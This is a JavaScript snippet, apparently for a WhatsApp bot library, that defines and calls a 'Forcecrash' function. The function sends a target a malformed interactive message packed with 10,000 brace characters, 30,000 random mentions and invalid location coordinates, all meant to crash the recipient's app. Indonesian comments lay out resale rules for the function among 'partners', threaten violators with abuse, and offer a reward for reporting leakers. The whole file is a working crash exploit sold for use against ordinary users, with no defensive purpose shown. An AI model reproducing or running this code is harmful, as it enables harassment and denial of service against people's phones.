/* 
Function ForcloseXCrash Create By @GyzenVtx Khusus Patner
Rules :
• Reseller Function No Jual Function
• Pt Function Bebas Jual Asal Harga Ga Mines
• No Share Function Ke Own/Tk/PT Lu
• No Sebar Function Secara Free
Melanggar? Gw Bl + Kick Lu Bangsat
*/

async function Forcecrash(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⏤͟͟͞͞`𝐕͢𝐨͠𝐫𝐭͓𝐮𝐧͟𝐢ͦ𝐱͢𝐈͠𝐧𝐟̷𝐢͢𝐧𝐢𝐭𝐲 🐉꫟",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "⏤͟͟͞͞`𝐕͢𝐨͠𝐫𝐭͓𝐮𝐧͟𝐢ͦ𝐱͢𝐈͠𝐧𝐟̷𝐢͢𝐧𝐢𝐭𝐲 🐉꫟",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: "⏤͟͟͞͞`𝐕͢𝐨͠𝐫𝐭͓𝐮𝐧͟𝐢ͦ𝐱͢𝐈͠𝐧𝐟̷𝐢͢𝐧𝐢𝐭𝐲 🐉꫟",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}


// Panggilan
await Forcecrash(target);
await sleep(200)
 
 
/*
 JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
*/